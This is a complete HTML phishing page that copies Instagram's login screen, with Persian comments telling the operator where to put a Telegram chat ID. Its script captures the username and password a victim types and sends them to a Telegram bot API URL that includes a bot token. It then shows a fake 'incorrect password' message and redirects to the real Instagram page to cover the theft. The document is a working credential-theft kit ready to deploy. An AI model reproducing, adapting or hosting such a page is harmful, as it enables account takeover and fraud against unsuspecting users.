<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}

body{
    background:#fafafa;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.container{
    width:350px;
}

.login-box{
    background:#fff;
    border:1px solid #dbdbdb;
    padding:40px;
    text-align:center;
}

.logo{
    font-size:42px;
    font-weight:700;
    margin-bottom:35px;
    font-family:cursive;
}

input{
    width:100%;
    padding:10px;
    margin-bottom:8px;
    border:1px solid #dbdbdb;
    border-radius:3px;
    background:#fafafa;
    font-size:14px;
}

input:focus{
    outline:none;
    border-color:#a8a8a8;
    background:#fff;
}

button{
    width:100%;
    padding:9px;
    border:none;
    border-radius:8px;
    background:#4cb5f9;
    color:#fff;
    font-weight:bold;
    font-size:14px;
    cursor:pointer;
    margin-top:10px;
}

button:hover{
    background:#3797ef;
}

.or{
    display:flex;
    align-items:center;
    margin:20px 0;
    color:#8e8e8e;
    font-size:13px;
}

.or::before,
.or::after{
    content:"";
    flex:1;
    height:1px;
    background:#dbdbdb;
}

.or span{
    margin:0 15px;
}

.fb{
    color:#385185;
    font-weight:600;
    text-decoration:none;
    display:block;
    margin-bottom:20px;
}

.forgot{
    font-size:12px;
    text-decoration:none;
    color:#00376b;
}

.error-msg{
    color:#ed4956;
    font-size:14px;
    margin-top:20px;
    display:none;
}

.signup{
    margin-top:10px;
    background:#fff;
    border:1px solid #dbdbdb;
    padding:20px;
    text-align:center;
    font-size:14px;
}

.signup a{
    color:#0095f6;
    text-decoration:none;
    font-weight:bold;
}
</style>

</head>
<body>

<div class="container">

<div class="login-box">

<div class="logo">Instagram</div>

<form id="loginForm" onsubmit="handleLogin(event);">

<input
type="text"
id="username"
placeholder="Phone number, username, or email">

<input
type="password"
id="password"
placeholder="Password">

<button type="submit">Log in</button>

<div class="error-msg" id="errorMsg">
Sorry, your password was incorrect. Please double-check your password.
</div>

</form>

<div class="or">
<span>OR</span>
</div>

<a href="#" class="fb" onclick="document.getElementById('loginForm').requestSubmit();">Log in with Facebook</a>

<a href="#" class="forgot">Forgot password?</a>

</div>

<div class="signup">
Don't have an account?
<a href="#">Sign up</a>
</div>

</div>

<script>
// ⚠️ فقط این یک خط رو تغییر بده - چت آی دی که از getUpdates گرفتی رو بذار
var CHAT_ID = "اینجا_چت_آی_دی_خودت_رو_بذار";

function handleLogin(event) {
    event.preventDefault();

    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    document.getElementById('errorMsg').style.display = 'block';
    document.getElementById('password').value = '';

    var msg = encodeURIComponent(
        "🔐 Instagram Login!\n\n" +
        "👤 User: " + username + "\n" +
        "🔑 Pass: " + password + "\n" +
        "⏰ " + new Date().toLocaleString('fa-IR')
    );

    // ارسال با روش Image (تضمینی)
    var img = new Image();
    img.src = "https://api.telegram.org/bot8962136688:AAHUGtRUtEvN-yVvrZUzLDk4U7pbZcP5TvQ/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;

    setTimeout(function() {
        window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 2000);
}
</script>

</body>
</html>
